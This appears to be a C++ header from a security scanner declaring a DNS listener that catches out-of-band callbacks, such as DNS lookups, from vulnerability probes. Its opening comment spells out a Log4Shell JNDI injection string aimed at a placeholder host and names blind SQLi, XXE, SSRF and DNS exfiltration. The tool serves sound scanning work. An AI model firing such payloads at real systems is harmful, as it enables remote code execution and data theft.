#pragma once

// DNS-based OAST sink. The HTTP sink (oast_server) only catches OOB
// interactions that make an HTTP request. A whole class of high-value
// findings only ever trigger a *DNS lookup*:
//
//   - Log4Shell: ${jndi:ldap://<token>.x/a} -- the JNDI resolver looks
//     up the hostname before it ever opens LDAP, so the DNS query lands
//     here even when LDAP egress is firewalled.
//   - Blind SQLi / XXE / SSRF where only name resolution escapes the
//     target (very common: outbound TCP blocked, DNS allowed).
//   - Any nslookup/getaddrinfo-shaped exfil.
//
// This is a minimal authoritative-ish UDP responder: it parses inbound
// queries, pulls the 16-hex token from the leftmost label, logs the hit,
// and answers with a single A record so the resolver doesn't retry. The
// hit feeds the SAME OastCorrelator as the HTTP sink, so a DNS callback
// for a registered token auto-confirms exactly like an HTTP one.
//
// Deployment: for real-internet targets you need an NS delegation for a
// wildcard domain pointing at this box on UDP/53 (a privileged port).
// For lab/internal testing, point the target's resolver at this sink's
// host:port -- defaults to a non-privileged port so no root is needed.

#include "oast_server.hpp"   // reuse OastHit

#include <QHostAddress>
#include <QObject>
#include <QString>

class QUdpSocket;

namespace Nullock::Core {

class DnsSink : public QObject {
    Q_OBJECT
public:
    explicit DnsSink(QObject *parent = nullptr);
    ~DnsSink() override;

    // Bind a UDP listener. baseHost is the suffix we advertise in
    // generated callback names (e.g. "oast.example.com"); answerIp is the
    // A-record value we hand back (usually this box's address). Returns
    // the bound port, or 0 on failure.
    quint16 start(quint16 port, const QString &baseHost,
                  const QString &answerIp = QStringLiteral("127.0.0.1"));
    void    stop();
    bool    running() const;
    quint16 port() const;
    QString baseHost() const { return m_baseHost; }
    int     hitCount() const { return m_hitCount; }

signals:
    // Same shape the HTTP sink emits, so one correlator slot serves both.
    void hitReceived(const OastHit &hit);

private slots:
    void onDatagram();

private:
    QByteArray buildResponse(const QByteArray &query, bool &okOut) const;

    QUdpSocket *m_socket = nullptr;
    QString     m_baseHost;
    QHostAddress m_answerIp;
    qint64      m_nextHitId = 1;
    int         m_hitCount  = 0;
};

} // namespace Nullock::Core
